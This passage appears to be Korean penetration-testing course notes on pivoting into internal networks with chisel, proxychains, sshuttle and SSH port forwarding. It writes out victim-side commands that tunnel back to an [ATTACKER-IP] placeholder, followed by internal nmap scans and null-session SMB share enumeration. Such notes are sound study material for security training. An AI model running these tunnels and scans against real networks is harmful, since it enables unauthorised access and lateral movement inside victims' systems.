4. proxychains 설정 후 내부 네트워크 접근

**공격자 측 - 서버:**

```bash
./chisel server -p 8080 --reverse
```

**피해자 측 - 클라이언트:**

```bash
# SOCKS5 리버스 프록시
./chisel client [ATTACKER-IP]:8080 R:socks
# → 공격자의 1080 포트에 SOCKS5 프록시 생성

# 특정 포트 포워딩
./chisel client [ATTACKER-IP]:8080 R:4444:127.0.0.1:80
```

**proxychains 설정:**

```bash
sudo nano /etc/proxychains4.conf
# → dynamic_chain 주석 해제
# → [ProxyList] 마지막에 추가:
socks5 127.0.0.1 1080
```

**proxychains 사용:**

```bash
# 반드시 -sT -Pn 사용! (ICMP 불가)
proxychains nmap -sT -Pn -p 22,80,443,445 [INTERNAL-IP]
proxychains crackmapexec smb [INTERNAL-IP] -u '' -p '' --shares
proxychains ssh user@[INTERNAL-IP]
proxychains firefox
```

> ※SOCKS를 통해 ICMP(ping)는 작동하지 않는다 → ping 실패해도 피벗이 성공한 것일 수 있음
>
> ※Nmap은 반드시 -sT -Pn 사용해야 한다 (SYN 스캔과 ICMP 핑 불가)

---

### 5-3 : sshuttle — SSH 기반 투명 VPN

sshuttle은 SSH를 통한 투명 VPN으로 별도 프록시 설정 없이 내부 네트워크 전체에 접근 가능하다

Heath Adams의 업데이트된 과정에서 직접 가르치는 도구이다

**사용 조건:**
1. 피해자 머신에 SSH 접근 가능해야 함
2. 피해자 머신에 Python 설치 필요

**공격 흐름:**
1. 외부 피해자 머신에 SSH 접근 확보
2. sshuttle로 내부 네트워크 대역 지정 후 실행
3. 투명 VPN처럼 내부망 전체 접근 가능
4. proxychains 없이 일반 도구 바로 사용 가능

**명령어:**

```bash
# 기본 사용
sshuttle -r user@[PIVOT-IP] [INTERNAL-SUBNET]

# 예시
sshuttle -r user@172.16.0.5 10.10.10.0/24

# SSH 키 사용
sshuttle -r user@[PIVOT-IP] [INTERNAL-SUBNET] -e 'ssh -i /path/to/key'

# 피벗 IP 제외 (루프 방지)
sshuttle -r user@[PIVOT-IP] [INTERNAL-SUBNET] -x [PIVOT-IP]

# 전체 서브넷
sshuttle -r user@[PIVOT-IP] 0/0 -x [PIVOT-IP]   # 모든 트래픽 피벗
```

---

### 5-4 : SSH 포트 포워딩

SSH 내장 포트 포워딩 기능으로 특정 포트만 피벗하거나 전체 SOCKS 프록시를 만들 수 있다

> ※포트 포워딩 = 특정 포트 하나만 연결
>
> ※SOCKS 프록시 = 모든 트래픽을 통째로 경유시킴 = 내부망 전체 사용 가능

```bash
# 로컬 포트 포워딩 (내부 서비스를 로컬에서 접근)
# 예: 내부 웹서버(10.10.10.5:80)를 로컬 8080으로 접근
ssh -L 127.0.0.1:8080:10.10.10.5:80 user@[PIVOT-IP] -N

# 동적 포트 포워딩 (SOCKS5 프록시)
ssh -D 1080 user@[PIVOT-IP] -N
# → /etc/proxychains4.conf에 socks5 127.0.0.1 1080 추가

# 리모트 포트 포워딩 (피해자 포트를 공격자에게 노출)
ssh -R 4444:127.0.0.1:4444 user@[ATTACKER-IP] -N
```

**옵션 설명:**

| 옵션 | 설명 |
|------|------|
| `-L` | 로컬 포트 포워딩 |
| `-D` | 동적 포트 포워딩 (SOCKS) |
| `-R` | 리모트 포트 포워딩 |
| `-N` | 명령 실행 없이 포워딩만 |
| `-f` | 백그라운드 실행 |
